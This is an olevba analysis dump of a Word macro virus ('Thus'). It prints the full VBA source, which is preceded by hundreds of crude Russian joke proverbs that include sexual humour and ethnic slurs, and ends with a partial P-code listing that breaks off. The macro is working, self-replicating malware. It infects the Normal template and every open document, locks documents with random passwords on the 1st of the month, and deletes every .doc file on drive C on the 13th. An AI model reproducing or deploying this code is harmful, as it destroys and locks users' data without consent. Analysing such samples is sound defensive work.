olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus.fs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus.fs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Pupkin'
'Любишь кататься - полезай в кузов.
'Hа безpыбье и слона из мухи сделаешь.
'Hа безбабье и рыбу раком.
'Hа безптичье и жопа соловей.
'Hа безрыбье и сам раком станешь.
'Hа воре и шапка глаза колет.
'Hа голом теле - здоровый дух.
'Hа нет ни туда ни суда нет.
'Hа пожаре и хрен - водопровод.
'Hа Родине хорошо, а дома лучше!
'Hа халяву и "РАМА" - сливочное масло.
'Hа халяву и зверь бежит.
'Hа чужой лобок не разевай роток!
'Hа чужую кровать рот не разевать!
'Hаглость - второе счастье.
'Hазвался груздем, обосрался и стой.
'Hазвался клизмой - полезай в жопу.
'Hакося -к, выкуpи!
'Hароду собралось - яблоку плюнуть негде!
'Hе pой яму дpугому, чтобы он не использовал ее как окоп.
'Hе водкой единой пьян человек!
'Hе все то золото, что плохо лежит.
'Hе все то солнышко, что встает.
'Hе говори гоп, коли рожа крива.
'Hе давши - крепись, а давши - держись!
'Hе имей сто друзей, а имей всех врагов!
'Hе имей сто друзей, а имей наглую рожу.
'Hе имей сто рублей, а имей сто баксов!
'Hе нытьем, так каканьем!
'Hе откладывай на завтpа то, что можно выпить сегодня.
'Hе откладывай на завтра ту, что можешь уже сегодня!
'Hе пей из колодца - пригодится плюнуть.
'Hе пеняй на зеркало, коли яйца мешают.
'Hе пеняй на зеркало, пока не перепрыгнешь.
'Hе плюй в калошу - пригодится в нее садиться!
'Hе плюй в колодец - вылетит не поймаешь.
'Hе плюй в колодец - сам туда попадешь.
'Hе плюй в колодец - там же никого нет...
'Hе пожелай ближнему жены своей.
'Hе поминайте Господа... всунем!
'Hе следи за хвостом, а то не заметишь рогов...
'Hе спеши, а то успеешь!
'Hе суй свой взнос не в свое дело!
'Hе так страшен черт, как его малютка!
'Hе тяни резину за хвост в долгий ящик.
'Hе уверен - не тормози!
'Hе яйца красят человека, а человек яйца!
'Hет повести печальнее на свете, чем повесть о миньете в туалете.
'Hет повести печальнее на свете,чем повесть о заклинившем RESETe...
'Hеча на зеркало пенять - коли!
'Hечего зеркало пинать, коли рожа крива.
'Hи пука, ни пёра!
'А зомби здесь тихие
'А не пойти ли мне на работу,- подумал я. И не пошел.
'А супружеский долг отдай Рублями
'А счастье было так возможно.... и так возможно...и вот так...
'Алкоголь в малых дозах безвреден в любом количестве!
'Американцы - мы из негров звезд не делаем
'Баба с возу - вылетит - не поймаешь.
'Баба с возу - кoбыла в куpсе дела.
'Баба с возу - потехе час.
'Баба с возу, и волки сыты!
'Базар копейку любит
'Беду наCLICKал... (из Windows'95)
'Без pубашки ближе к телу.
'Без пруда не вытащишь и рыбку из него.
'Без труда не засунешь и туда.
'Береги его как зеницу - во как.
'Береги честь смолоду - полюбишь и козла!
'Береги честь смолоду, коли рожа крива.
'Ближе к телу!
'Большому кораблю - большая торпеда.
'Бороться и искать, найти и перепрятать!
'Бронетемкин "Поносец".
'Будешь много жить - скоро состаришься
'Будешь тише - дольше будешь
'Быстрее, глубже, нежнее.
'В гаремах нет плохих танцоров
'В гостях хорошо, а дома плохо.
'В гостях хорошо, а дома у меня нету.
'В женский монастырь со своим усталым не ходят
'В конце концов, среди концов, найдешь конец ты наконец.
'В темноте все кошки серют.
'В чужое ОАО со своим уставом не ходят.
'Век вклада не видать.
'Вера может двигать горы, она - колоссальная баба.
'Взялся за гуж - не забудь сходить в душ
'Видеть вас - одно удовольствие, а не видеть - другое
'Видно птицу по помету
'Вино, девочки, ночная Москва, милиция, драки, разбитые автомобили, разорённые гнёзда любви
'Водка "Буратино" - почувствуйте себя дровами
'Возьми коня за рога!
'Волков бояться - в лесу не ебаться!
'Время лечит, но доктор - быстрее.
'все гениальное - простынь
'Все генитальное просто.
'Все лишнее - детям!
'Всё не так плохо как вы думаете, все намного хуже
'Все хорошо, что хорошо качается
'Выйти в город: у людей посмотреть, да свой показать...
'Где совок - там и мусор.
'Гениталии всех стран - соединяйтесь!
'Глyпый пингвин pобко пpячет, хитpый - нагло достает.
'Главное, ребята, перцем не стареть
'Говорят, что смех продлевает жизнь того, кто смеется, очевидно за счет жизни того, над кем
'Голод не тетка - в лес не убежит.
'Голод не тетка - полюбишь и козла.
'Голубая мечта - найти друга
'Гостей встpечают по одежке, а пpовожают - по моpде!
'Готовь сани летом, а честь смолоду.
'Гроша выеденного не стоит.
'Даже если вас съели, у вас есть два выхода
'Даже хорошей танцовщице порой мешает то, что мешает плохому танцору
'Дай дураку хуй стеклянный, он и хуй разобьет и руки порежет.
'Дайте солдату точку опоры, и он... уснет.
'Дальше - больше...быстрее, выше, сильнее...
'Дареному провайдеру в канал не смотрят.
'Даром - за амбаром, понял
'Де юро, де факто, де било.
'Делу вpемя, потехе - деньги.
'Держи себя в руках!, если тебя не держат ноги.
'Дети - цветы жизни. Дарите женщинам цветы!
'Длинные ноги - не роскошь, а средство передвижения
'Днем с огнем, вечером - разогнем
'До самых костей мозга...
'Долг нагишом платят
'Долг платежом страшен.
'Долг процентом красен.
'Дома негра и стены ненавидят.
'Дома от воpа и стены не помогут.
'Друг познается в бидэ.
'Друга нельзя купить, зато его можно продать.
'Дружба дружбой, но куда же деть либидо?
'Друзья познаются в еде
'Ёж птица гордая. Пока не пнешь - не полетит!
'Если Вы проснулись на улице, значит Вы там заснули
'Если голова болит, значит она есть
'Если нельзя, но очень хочется, то можно!
'Если хочешь петь - пей!
'Если хочешь поработать - ляг, поспи, и все пройдет!
'Есть еще порох в пороховницах и ягоды в ягодицах! (и влага во влагалище)
'Есть ещё шары в шароварах
'Жареному коню в жопу не смотрят.
'Желаем Вам счастья, здоровья и творческих узбеков
'Желаю Вам здоровья в личной жизни
'Женщины любят мужчину в себе, а мужчины себя в женщине!
'Женщины способны на все, мужчины - на все остальное
'Жизнь - вредная штука - от нее умирают...
'Жизнь невозможно повернуть назад, да и зачем она там?
'Жизнь прожить - не два пальца обоссать!
'Жила-была девочка, сама виновата.
'За двумя зайцами погонишся - дуракам закон не писан.
'За двумя зайцами погонишся - на тапор напорешься.
'За двумя зайцами погонишся - никуда не дозвонишся.
'За двумя зайцами погонишься - от обоих по моpде получишь.
'За двумя зайцами погонишься - третьего не поймаешь!
'За одного битого 15 суток дают.
'Замысел без умысла называется вымыслом.
'Заряженному танку в дуло не смотрят.
'Здесь будет город заложен - надпись на ломбарде.
'Здравствуйте, мужчины и женщины, а так же те, у кого ещё все впереди
'Земли - крестьянам, заводы - рабочим, пиво - МНЕ.
'Зубов боятся - в рот не давать.
'И баба с возу, и волки сыты
'И волки сыты, и овцы целки.
'И женщина, как буря, улеглась
'И на елку залезть, и жопу не ободрать.
'И ухом не моргнул!
'Изготовим портрет вашего врага на туалетной бумаге
'Иных уж нет, других - долечим
'Искусство требует жертв, и с каждым днем их становится все больше.
'Ищи негра ночью!
'Каждая пипетка мечтает стать клизмой
'Каждой твари - по паре. (так говорил некий препод на экзамене)
'Каждой твари - по харе!
'Каждый мужчина имеет право налево
'Каждый народ имеет такое правительство, которое имеет его.
'Как два байта переслать...
'Как много девушек хороших, а я люблю женатого
'Как много девушек хороших, но тянет что-то на плохих
'Как упоительна в России ветчина
'Каков стол, таков и стул.
'Какой быстрый ездок не любит "Русской"
'Капля никотина убивает лошадь, а хомяка разрывает на куски
'Кишка тонка, и танки наши быстры!
'Клизма, Знай свое место
'Кому тошно, а кому и в попу можно.
'Конец - телу венец
'Кончил мимо - гуляй смело.
'Кончил смело - гуляй мимо.
'Красна изба не кутежами, а своевременными платежами
'Крепче за шоферку держись, баран
'Крыша есть - ума не надо.
'Кто pано встает, тот pано помpет.
'Кто к нам с мечом придёт, тот в орало и получит.
'Кто к нам с рублем пришел - тот от рубля и погибнет
'Кто курит - кончает раком, а кто бросает курить - оттягивает свой конец.
'Кто на рояли играет, тот ее и носит
'Кто не работает, тот пьет!
'Кто последний, тот и вводит.
'Кто последний, тот и папа!
'Кто раньше встал, того и тапки
'Куда ни кинь, сам туда попадешь.
'Куй железо не отходя от кассы!
'Лежит боец, не справился с атакой
'Лети с приветом, вернись умным
'Ложись девка и большая и маленькая.
'Лучше гор могут быть только горцы
'Лучше иметь синицу в руках, чем утку под кроватью.
'Лучше иметь синицу, когда она в руках!
'Лучше колымить на Гондурасе, чем гондурасить на Колыме
'Лучше переспать, чем недоесть
'Лучше синица в руках, чем утка под кроватью
'Лучше ужасный конец, чем ужас без конца.
'Лучший способ покончить в себя - наложить себе в руки.
'Лысый пешему не конный.
'Любви все плоскости покорны
'Любимая, таких, как ты, не было, нет и не надо
'Любите Родину, мать вашу!
'Любишь кататься - катись к чеpтовой матеpи!
'Любишь кататься - люби и катайся!
'Любишь кататься - люби и с санками ебаться.
'Любишь кататься, имей сто рублей.
'Любишь кататься, люби и самочек возить!
'Мал золотник, да и взять негде.
'Маленькая рыбка лучше большого таракана
'Мальчик кончил в тампон.
'Маникюр -медикам, педикюр - педикам
'Машу пальцем не испортишь.
'Меня голыми ногами не возьмешь!!!
'Меняю проигрыватель на выигрыватель.
'Местами стать бы Гулливером
'Мир DOOM 'у твоему...
'Митя идет на митинг а Петя идет на петтинг.
'Могила горбатого - справа.
'Мой дядя самых честных грабил
'Мой дядя самых честных грабил.
'Мойте руки вместо еды.
'Мойте руки, перед и зад
'Мужчина - это такая тварь, хуже которой может быть только женщина.
'Мужчина гоняется за женщиной, пока она его не поймает
'мужчины -Женитесь, Женщины - Мужайтесь
'Мы придем к Вам на выручку, если есть выручка
'На ошибках мучаются
'На птичьих правах далеко не взлетишь
'Надпись над писсуаром: "Не льсти себе, подойди поближе"
'Нам химия блондинок подарила
'Наши поезда - самые поездатые поезда в мире
'Не болтайте ерундой
'Не бросай друга в биде
'Не все то золото, что плохо лежит
'Не все то солнышко, что встает
'Не могу стоять когда другие работают, пойду полежу
'Не могу стоять на своем, очень больно
'не отвлекаются, любя
'Не перепились еще на Руси богатыри-добры молодцы
'Не по Хуану сомбреро
'Не порно, да задорно
'Не рой другому яму, пусть сам роет
'Не руби сук, на которых сидишь
'Не свисти - девок не будет
'Не стой под струей
'Не суй свой взнос не в свое дело
'Не так страшен черт, как его малютка
'Не умеешь петь - не пей
'Не учи отца и баста
'Невеста запатентовала предложение жениха
'Нету денег - привяжите сзади веник, бегите и метите, наметете - приносите
'Ниже пейджера не бей
'Ничто не красит так женщин, как перекись водорода
'Ну и запросы у вас - сказала база данных и повисла.
'Нырнул с аквалангом - не прикидывайся шлангом
'О чем у нас говорится, все в дело годится
'Обиваю двери кожей заказчика
'Обналичим Нобелевскую премию
'Один в поле - хуже татарина.
'Одна голова - хоpошо, а два сапога паpа.
'Одна голова хорошо, а все тело лучше
'Однажды в студеную зимнюю пору смотрю - поднимается медленно
'Однажды лебедь раком щуку...
'Он сказал: "Поехали" и запил водой
'Она была лишена девственности стрелой амура
'Она конечно не Венера, но что-то венерическое в ней есть...
'Она на него рукой плюнула.
'Оральный секс с вытекающими оттуда последствиями.
'Оставь одежду, всяк сюда входящий!
'Остановите Землю, я сойду
'Отдам концы в хорошие руки.
'Папуас папуасу друг, товарищ и корм.
'Первый блин маслом не испортишь.
'Пиво с утра не только вредно, но и полезно
'Пионерка - всем ребятам примерка.
'Плати не ломайся - потом наслаждайся
'Плачет девочка в банкомате
'Плох тот солдат, который не мечтает спать с генералом'
'Плох тот солдат, который не хочет.
'Плох тот солдат, который упал и не отжался.
'По ногам текло, а в рот не попало!
'Под лежачий камень мы всегда успеем
'Поймал мыша - ешь не спеша
'Пока семь раз отмеришь - другие уже отрежут!
'Пользуясь случаем, хочу
'Посредством маразма дойдем до оргазма
'Постоять за себя, полежать за других
'Потерялся черный дипломат, нашедшего просят сдать его в посольство Нигерии
'Почем вы девушки красивых любите
'Почём Вы, девушки, красивых любите
'Предлагаю руку и серце в обмен на грудь и бедра
'Пришел, увидел и ушел.
'Пришел , увидел, побелил
'Продается мальчик на побегушках. Пробег 3000 верст.
'Протяну ноги в хорошие руки
'Проходи , Ложись, здравствуй
'Работа - не волк, а пpоизведение силы на pасстояние.
'Работа не хрен - 100 лет простоит.
'Ребята, с Моникой Левински надо кончать
'Ровно в полночь начнут бить кремлевские курсанты.
'Рожденный брать давать не может.
'Рожденный ползать упасть не может
'Рыбак рыбака ненавидит наверняка
'С кем поведешся, с тем и наберешся.
'С кем поведешься - от того и забеременеешь.
'С кем поведешься - так тебе и надо
'С корабля на баб.
'С мылом рай и в шалаше
'С наступающим Вас опьянением
'Свежо питание, да серется с трудом!
'Своя Hаташка ближе к телу.
'Своя смирительная рубашка ближе к телу.
'Свято место с бюстом не бывает
'Сделай доброе дело и оно тебя достанет!
'Сделал дело - бабу с воза.
'Сделал дело - вымой тело
'Сделал дело - кобыле легче.
'Сделал дело - слезай с тела.
'Секс без дивчины - признак дурачины
'Семеро одного козлят.
'Семеро одного найдут
'Семеро одного найдут.
'Семь пядей в лобке...
'Семь раз об дверь, один раз об рельс
'Семь раз отпей, один раз отъешь
'Скажи-ка тётя, ты не даром
'Скажите, вы в мультфильмах не снимались
'Сказала "НЕТ" и головой кивнула
'Склероз вылечить нельзя, зато о нем можно забыть
'Сколько в колодец не плюй, а все pавно в лес тянет.
'Сколько водки не бери, все равно два раза бегать
'Сколько волка не корми, а он все равно ест!
'Сколько волка не корми, а он все равно лоб расшибет!
'Сколько волка не корми, а он все равно смотрит!
'Сколько волка не корми, а у слона все равно больше!
'Сколько Лен - столько Зин
'Слово не воробей, на голову не насрёт!
'Слово не воробей, поймают - вылетишь.
'Снимаю, порчу.
'Сниму трусы
'Со зрением плохо, денег не вижу
'Советские курицы - самые стройные курицы в мире
'Советские микросхемы - самые большие микросхемы в мире!
'Солдат по осени считают.
'Солнце встало выше ели - время срать, а мы не ели.
'Спички детям не помеха.
'Старость - не радость, маразм - не оргазм
'Старый друг лучше 2 подруг
'Супружеский долг. Исполняется впервые
'Счастливые трусов не надевают
'Счастье есть, оно не может не есть
'Сытый конному не пеший
'Сытый пьяного не разумеет.
'Там хорошо, где нас!
'Таможня берет добро
'Темнота - залог здоpовья.
'Тёти до 16 лет не допускаются
'Типун вам на ваш великий и могучий русский язык
'Тиха украинская ночь, но САЛО надо перепрятать
'Тише будешь - дальше уедешь.
'Тише едешь - дальше будешь (от того места - куда едешь) .
'Тише едешь - толще морда.
'Тише едешь - хрен приедешь!
'То, что женщине по душе, мужчине не по карману
'Тому виднее, у кого нос длиннее
'Тому стыдно, у кого видно
'Тощая корова ещё не газель
'Трое в лодке, не стесняясь собаки
'Ты, малый, не дурак, и дурак не малый.
'Тяжело в лечении - легко в гробу
'У бобра добра не ищут
'Улыбайтесь, шеф любит идиотов
'Умом ты можешь не блистать, но сапогом блистать обязан!
'Унитазу в душу насрали
'Утро вечера дряннее
'Утро добрым не бывает
'Уходя, гасите всех.
'Ученье - свет, а за свет надо платить.
'Ученье - свет, а неученых - тьма!
'Ученье свет, а неученье - чуть свет на работу...
'Фарш невозможно провернуть назад и мясо из котлет не восстановишь...
'Хирурги считают, что внутренний мир человека лучше всего раскрывается на операционном столе
'Хозяйство вести - не хламом трясти
'Хорошо смеется тот, кто смеется как лошадь.
'Хорошо смеется тот, кто стреляет последним.
'Хорошо, когда собака - друг, но плохо, когда друг - собака.
'Хочешь большого и чистого - помой слона!
'Хуй - железо, пока горячий.
'Цель оправдывает противозачаточные срeдства.
'Цивильный серюльник.
'Цыплят по осени стреляют
'Чего пить, того не миновать.
'Чего-то хочется, а кого не знаю...
'Чем больше женщину мы меньше, тем меньше больше мы ее!
'Чем больше нас, тем меньше их
'Чем бы дитя не тешилось, лишь бы не забеременело.
'Чем бы дитя не тешилось, лишь бы не руками
'Чем бы дитя не тешилось, лишь бы своих не наделало.
'Чем дальше в лес - тем больше извращенцев.
'Чем дальше в лес, тем ближе вылез.
'Чем дальше в лес, тем ну его на хуй!
'Чем дальше в лес, тем толще партизаны
'Чем дальше в лес, тем третий лишний
'Чем дальше влез, тем ближе вылез
'Чем меньше девушек мы любим, тем больше времени на сон
'Чем удобряли, то и выросло.
'Чем шире наши морды, тем теснее наши ряды
'Что в имени тебе моем, ты оцени груди объем
'Что в рот влезло, то полезно.
'Что в рот, что по лбу!
'Что естественно - то не без оргазма.
'Что посеешь, то уже не найдешь!
'Что посмеешь, то и пожмешь
'Что с возу упало - тому и глаз вон.
'Что с возу упало, то не вырубишь топором.
'Чтоб ты жил на одну рекламу
'Чтобы узнать перспективу надо ее пощупать
'Чья бы корова мычала, а твоя бы засунула палец в жопу и не пиздела!
'Шило - не воpобей, в лес не убежит.
'Шило в мешке не утаишь - все равно наверх всплывет!
'Щи да каша - сладкая парочка.
'Экипаж прощается с вами и желает Вам приятного полета
'Это все шито по воде белыми вилами.
'Это еще писями по воде виляно.
'Эх, хорошо, когда хорошо кончается!
'Юноши и девушки, овладевайте друг другом
'Я Вас любил, деревья гнулись
'Я знаю каратэ, тыквандо, дзюдо и еще мноого страшных СЛОВ
'Я люблю тебя, жизнь, ну а ты меня - снова и снова
'Я милого узнаю по колготкам
'Я на тебе - никогда
'Я наклонился посмотреть, не наклонилась ли она, чтоб посмотреть, не наклонился ли я...
'Я не сплю с утками и с курами тоже не сплю
'Я себя не люблю, просто очень нравлюсь
'Я сегодня не такой, как вчера (а вчера я был ваще никакой!)
'Я сухой закон блял, бляду и блядь буду!
'Язык до киллера доведет
'Язык до клитера доведёт
'Яйца в мундирах, картошка всмятку.
'Яйца курицу дисциплинируют
'Яйца ломаного не стоит.
'Яйцо от курицы недалеко падает.
'Ямщик, не гони! Ты гонишь, ямщик!
Private Sub Document_Open()
    Dim sgn1 As String
    Dim sgn2 As String
    Dim st As String
    Dim b As Boolean
sgn1 = "'Pupkin'"
sgn2 = "'Vasya'"
b = False
On Error GoTo er
Open "c:\~sgn.^&#" For Input As #1
Input #1, st
 If st = "ACCESS DENiED" Then b = True
Close #1
er:
If (b = False) And ((ThisDocument.Name = NormalTemplate.Name) Or (NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sgn1)) Then
    On Error Resume Next
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sgn1 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If (Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sgn1) Or _
    (Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sgn2) Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
     If Application.Documents.Item(k).Saved = False Then
        Application.Documents.Item(k).Save
     End If
    Next k
    Randomize
    
    If (Day(Now()) = 1) Then
    For k = 1 To Application.Documents.Count '
     Application.Documents.Item(k).Password = _
     Str(Int(220 * Rnd() + 35)) + Str(Int(220 * Rnd() + 35)) + _
     Str(Int(220 * Rnd() + 35)) + Str(Int(220 * Rnd() + 35))
     Application.Documents.Item(k).Save
    Next k
    End If

  Application.Caption = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(Int(Rnd() * 460 + 2), 1)
  
  If (Hour(Time()) = 14) And (Minute(Time()) = 23) Then
   MsgBox ("Диск успешно отформатирован")
  End If
 
  If (Day(Now()) Mod 2) = 0 Then
   ActiveDocument.ActiveWindow.Caption = "Привет от Васи Пупкина !!!"
  End If
  
    If (Day(Now()) = 13) Then
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = True
        .FileName = "*.doc"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For I = 1 To .FoundFiles.Count
        Kill .FoundFiles(I)
        Next I
        End If
    End With
    End If
Else: If b = True Then MsgBox ("Запись запрещена")
End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub






















































































-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Thus.fs
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 46326 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0007 "Pupkin'"
' Line #1:
' 	QuoteRem 0x0000 0x0022 "Любишь кататься - полезай в кузов."
' Line #2:
' 	QuoteRem 0x0000 0x0025 "Hа безpыбье и слона из мухи сделаешь."
' Line #3:
' 	QuoteRem 0x0000 0x0019 "Hа безбабье и рыбу раком."
' Line #4:
' 	QuoteRem 0x0000 0x001C "Hа безптичье и жопа соловей."
' Line #5:
' 	QuoteRem 0x0000 0x0020 "Hа безрыбье и сам раком станешь."
' Line #6:
' 	QuoteRem 0x0000 0x001C "Hа воре и шапка глаза колет."
' Line #7:
' 	QuoteRem 0x0000 0x001D "Hа голом теле - здоровый дух."
' Line #8:
' 	QuoteRem 0x0000 0x001B "Hа нет ни туда ни суда нет."
' Line #9:
' 	QuoteRem 0x0000 0x001E "Hа пожаре и хрен - водопровод."
' Line #10:
' 	QuoteRem 0x0000 0x001F "Hа Родине хорошо, а дома лучше!"
' Line #11:
' 	QuoteRem 0x0000 0x0025 "Hа халяву и "РАМА" - сливочное масло."
' Line #12:
' 	QuoteRem 0x0000 0x0018 "Hа халяву и зверь бежит."
' Line #13:
' 	QuoteRem 0x0000 0x0020 "Hа чужой лобок не разевай роток!"
' Line #14:
' 	QuoteRem 0x0000 0x0021 "Hа чужую кровать рот не разевать!"
' Line #15:
' 	QuoteRem 0x0000 0x001A "Hаглость - второе счастье."
' Line #16:
' 	QuoteRem 0x0000 0x0023 "Hазвался груздем, обосрался и стой."
' Line #17:
' 	QuoteRem 0x0000 0x0022 "Hазвался клизмой - полезай в жопу."
' Line #18:
' 	QuoteRem 0x0000 0x0012 "Hакося -к, выкуpи!"
' Line #19:
' 	QuoteRem 0x0000 0x0028 "Hароду собралось - яблоку плюнуть негде!"
' Line #20:
' 	QuoteRem 0x0000 0x0038 "Hе pой яму дpугому, чтобы он не использовал ее как окоп."
' Line #21:
' 	QuoteRem 0x0000 0x001E "Hе водкой единой пьян человек!"
' Line #22:
' 	QuoteRem 0x0000 0x0022 "Hе все то золото, что плохо лежит."
' Line #23:
' 	QuoteRem 0x0000 0x001F "Hе все то солнышко, что встает."
' Line #24:
' 	QuoteRem 0x0000 0x001F "Hе говори гоп, коли рожа крива."
' Line #25:
' 	QuoteRem 0x0000 0x0026 "Hе давши - крепись, а давши - держись!"
' Line #26:
' 	QuoteRem 0x0000 0x0027 "Hе имей сто друзей, а имей всех врагов!"
' Line #27:
' 	QuoteRem 0x0000 0x0027 "Hе имей сто друзей, а имей наглую рожу."
' Line #28:
' 	QuoteRem 0x0000 0x0026 "Hе имей сто рублей, а имей сто баксов!"
' Line #29:
' 	QuoteRem 0x0000 0x0018 "Hе нытьем, так каканьем!"
' Line #30:
' 	QuoteRem 0x0000 0x0035 "Hе откладывай на завтpа то, что можно выпить сегодня."
' Line #31:
' 	QuoteRem 0x0000 0x0033 "Hе откладывай на завтра ту, что можешь уже сегодня!"
' Line #32:
' 	QuoteRem 0x0000 0x0027 "Hе пей из колодца - пригодится плюнуть."
' Line #33:
' 	QuoteRem 0x0000 0x0026 "Hе пеняй на зеркало, коли яйца мешают."
' Line #34:
' 	QuoteRem 0x0000 0x002A "Hе пеняй на зеркало, пока не перепрыгнешь."
' Line #35:
' 	QuoteRem 0x0000 0x002D "Hе плюй в калошу - пригодится в нее садиться!"
' Line #36:
' 	QuoteRem 0x0000 0x0028 "Hе плюй в колодец - вылетит не поймаешь."
' Line #37:
' 	QuoteRem 0x0000 0x0026 "Hе плюй в колодец - сам туда попадешь."
' Line #38:
' 	QuoteRem 0x0000 0x0028 "Hе плюй в колодец - там же никого нет..."
' Line #39:
' 	QuoteRem 0x0000 0x001F "Hе пожелай ближнему жены своей."
' Line #40:
' 	QuoteRem 0x0000 0x001F "Hе поминайте Господа... всунем!"
' Line #41:
' 	QuoteRem 0x0000 0x002E "Hе следи за хвостом, а то не заметишь рогов..."
' Line #42:
' 	QuoteRem 0x0000 0x0017 "Hе спеши, а то успеешь!"
' Line #43:
' 	QuoteRem 0x0000 0x0021 "Hе суй свой взнос не в свое дело!"
' Line #44:
' 	QuoteRem 0x0000 0x0025 "Hе так страшен черт, как его малютка!"
' Line #45:
' 	QuoteRem 0x0000 0x0026 "Hе тяни резину за хвост в долгий ящик."
' Line #46:
' 	QuoteRem 0x0000 0x0017 "Hе уверен - не тормози!"
' Line #47:
' 	QuoteRem 0x0000 0x0028 "Hе яйца красят человека, а человек яйца!"
' Line #48:
' 	QuoteRem 0x0000 0x0040 "Hет повести печальнее на свете, чем повесть о миньете в туалете."
' Line #49:
' 	QuoteRem 0x0000 0x0042 "Hет повести печальнее на свете,чем повесть о заклинившем RESETe..."
' Line #50:
' 	QuoteRem 0x0000 0x001E "Hеча на зеркало пенять - коли!"
' Line #51:
' 	QuoteRem 0x0000 0x0027 "Hечего зеркало пинать, коли рожа крива."
' Line #52:
' 	QuoteRem 0x0000 0x0011 "Hи пука, ни пёра!"
' Line #53:
' 	QuoteRem 0x0000 0x0013 "А зомби здесь тихие"
' Line #54:
' 	QuoteRem 0x0000 0x0034 "А не пойти ли мне на работу,- подумал я. И не пошел."
' Line #55:
' 	QuoteRem 0x0000 0x0020 "А супружеский долг отдай Рублями"
' Line #56:
' 	QuoteRem 0x0000 0x003D "А счастье было так возможно.... и так возможно...и вот так..."
' Line #57:
' 	QuoteRem 0x0000 0x0034 "Алкоголь в малых дозах безвреден в любом количестве!"
' Line #58:
' 	QuoteRem 0x0000 0x0029 "Американцы - мы из негров звезд не делаем"
' Line #59:
' 	QuoteRem 0x0000 0x0024 "Баба с возу - вылетит - не поймаешь."
' Line #60:
' 	QuoteRem 0x0000 0x0022 "Баба с возу - кoбыла в куpсе дела."
' Line #61:
' 	QuoteRem 0x0000 0x0019 "Баба с возу - потехе час."
' Line #62:
' 	QuoteRem 0x0000 0x001A "Баба с возу, и волки сыты!"
' Line #63:
' 	QuoteRem 0x0000 0x0013 "Базар копейку любит"
' Line #64:
' 	QuoteRem 0x0000 0x0021 "Беду наCLICKал... (из Windows'95)"
' Line #65:
' 	QuoteRem 0x0000 0x0019 "Без pубашки ближе к телу."
' Line #66:
' 	QuoteRem 0x0000 0x0026 "Без пруда не вытащишь и рыбку из него."
' Line #67:
' 	QuoteRem 0x0000 0x001D "Без труда не засунешь и туда."
' Line #68:
' 	QuoteRem 0x0000 0x001F "Береги его как зеницу - во как."
' Line #69:
' 	QuoteRem 0x0000 0x0028 "Береги честь смолоду - полюбишь и козла!"
' Line #70:
' 	QuoteRem 0x0000 0x0026 "Береги честь смолоду, коли рожа крива."
' Line #71:
' 	QuoteRem 0x0000 0x000D "Ближе к телу!"
' Line #72:
' 	QuoteRem 0x0000 0x0023 "Большому кораблю - большая торпеда."
' Line #73:
' 	QuoteRem 0x0000 0x0027 "Бороться и искать, найти и перепрятать!"
' Line #74:
' 	QuoteRem 0x0000 0x0016 "Бронетемкин "Поносец"."
' Line #75:
' 	QuoteRem 0x0000 0x0025 "Будешь много жить - скоро состаришься"
' Line #76:
' 	QuoteRem 0x0000 0x001B "Будешь тише - дольше будешь"
' Line #77:
' 	QuoteRem 0x0000 0x0018 "Быстрее, глубже, нежнее."
' Line #78:
' 	QuoteRem 0x0000 0x001D "В гаремах нет плохих танцоров"
' Line #79:
' 	QuoteRem 0x0000 0x001E "В гостях хорошо, а дома плохо."
' Line #80:
' 	QuoteRem 0x0000 0x0024 "В гостях хорошо, а дома у меня нету."
' Line #81:
' 	QuoteRem 0x0000 0x002D "В женский монастырь со своим усталым не ходят"
' Line #82:
' 	QuoteRem 0x0000 0x0037 "В конце концов, среди концов, найдешь конец ты наконец."
' Line #83:
' 	QuoteRem 0x0000 0x001A "В темноте все кошки серют."
' Line #84:
' 	QuoteRem 0x0000 0x0026 "В чужое ОАО со своим уставом не ходят."
' Line #85:
' 	QuoteRem 0x0000 0x0015 "Век вклада не видать."
' Line #86:
' 	QuoteRem 0x0000 0x0031 "Вера может двигать горы, она - колоссальная баба."
' Line #87:
' 	QuoteRem 0x0000 0x0027 "Взялся за гуж - не забудь сходить в душ"
' Line #88:
' 	QuoteRem 0x0000 0x0034 "Видеть вас - одно удовольствие, а не видеть - другое"
' Line #89:
' 	QuoteRem 0x0000 0x0015 "Видно птицу по помету"
' Line #90:
